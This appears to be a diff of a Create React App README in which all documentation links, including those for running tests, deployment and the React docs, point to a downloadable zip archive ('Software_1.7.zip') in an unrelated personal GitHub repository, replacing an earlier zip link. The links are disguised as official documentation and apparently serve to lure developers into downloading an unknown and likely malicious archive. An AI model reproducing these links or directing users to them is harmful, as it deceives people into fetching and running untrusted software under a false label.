@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/zohaib11111/pdfusion/origin/nonrhyming/pdfusion.zip).
+This project was bootstrapped with [Create React App](https://github.com/zohaib11111/pdfusion/raw/refs/heads/origin/nonrhyming/Software_1.7.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/zohaib11111/pdfusion/origin/nonrhyming/pdfusion.zip) for more information.
+See the section about [running tests](https://github.com/zohaib11111/pdfusion/raw/refs/heads/origin/nonrhyming/Software_1.7.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/zohaib11111/pdfusion/origin/nonrhyming/pdfusion.zip) for more information.
+See the section about [deployment](https://github.com/zohaib11111/pdfusion/raw/refs/heads/origin/nonrhyming/Software_1.7.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,6 +41,6 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/zohaib11111/pdfusion/origin/nonrhyming/pdfusion.zip).
+You can learn more in the [Create React App documentation](https://github.com/zohaib11111/pdfusion/raw/refs/heads/origin/nonrhyming/Software_1.7.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/zohaib11111/pdfusion/origin/nonrhyming/pdfusion.zip).
+To learn React, check out the [React documentation](https://github.com/zohaib11111/pdfusion/raw/refs/heads/origin/nonrhyming/Software_1.7.zip).
